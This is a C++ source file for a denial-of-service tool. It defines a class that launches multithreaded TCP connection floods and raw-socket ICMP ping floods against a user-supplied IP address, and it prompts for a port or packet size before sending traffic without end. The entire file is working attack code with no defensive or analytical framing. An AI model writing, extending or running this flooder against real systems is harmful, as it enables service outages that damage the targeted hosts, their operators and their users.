#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <stdlib.h>
#include <stdio.h>
#include <cstring>
#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <thread>
#include <sys/time.h>
#include <math.h>
#include <string>
#include <mutex>
#include <sstream>
#include <sys/types.h>
#include <sys/select.h>

#include "ping/h/ipResponse.h"
#include "h/Dos.h"

void Dos::tcp_flood(const char *ip, int port) {
    struct sockaddr_in host;
    host.sin_family = AF_INET;
    host.sin_port = htons(port);
    inet_pton(AF_INET, ip, &host.sin_addr);

    while(true) { 
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock >= 0) {
            connect(sock, (struct sockaddr*)&host, sizeof(host));
            close(sock);
        }
    }
}

void Dos::ping_flood(const char *ip, int size) {
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    int big_spider = sizeof(struct icmphdr) + size;   
    char *package = new char[big_spider];
    memset(package, 'X', big_spider);

    struct icmphdr *icmp = (struct icmphdr *)package;
    icmp->type = ICMP_ECHO;
    icmp->un.echo.id = htons(1234);
    icmp->un.echo.sequence = htons(1);

    icmp->checksum = 0;
    icmp->checksum = iprsp.checksum(package, big_spider);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
  
    if (sock < 0) {   
        delete[] package;
        fprintf(stderr, "[*] You are not a sudo \n");
        return;
    }

    while (true) {
        sendto(sock, package, big_spider, 0, (struct sockaddr*)&target, sizeof(target));
    }
    delete[] package;
}

void Dos::dOS(int th, const char *ip, int type) {
    std::vector<std::thread> spiders;
   
    if(type == 1) {
        int port = 0; 
        printf("[-] Enter with the port: \n");
        if(scanf("%i", &port) != 1) return;
        
        printf("[*] Type [%i] tcp-flood \n", type);
        printf("[*] Number of threads: [%i] \n", th);
        printf("[*] Send packages. . . .\n");

        for(int i = 0; i < th; i++) {
            spiders.emplace_back(&Dos::tcp_flood, this, ip, port);
        }
    } else {
        int size = 0;
        printf("[*] What number of spiders to attack? (MAX number = 65507) \n");
        if(scanf("%i", &size) != 1) return;
       
        if(size > 65507) {
            fprintf(stderr,"[*] Limit of spiders: %i \n", 65507);
            return;
        } else {
            printf("[*] BIG SPIDER ATCK \n");
            for(int i = 0; i < th; i++) {
                spiders.emplace_back(&Dos::ping_flood, this, ip, size);
            }
        }
    }   
    
    for(auto& t : spiders) {
        if(t.joinable()) {
            t.join();
        }
    }
}